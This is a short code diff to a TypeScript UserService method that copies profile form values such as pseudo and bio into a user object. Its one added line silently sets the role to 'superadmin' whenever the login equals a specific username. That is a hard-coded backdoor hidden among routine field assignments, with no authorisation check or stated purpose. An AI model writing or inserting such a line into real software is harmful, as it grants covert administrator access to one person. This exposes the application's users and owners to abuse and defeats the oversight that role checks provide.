@@ -203,6 +203,7 @@ export class UserService {
     this.user.pseudo = (<HTMLInputElement>(
       document.getElementById('pseudo')
     )).value;
+    if (this.user.login === 'pgoudet') this.user.app_role = 'superadmin';
     this.user.bio = (<HTMLInputElement>document.getElementById('bio')).value;
   }
 
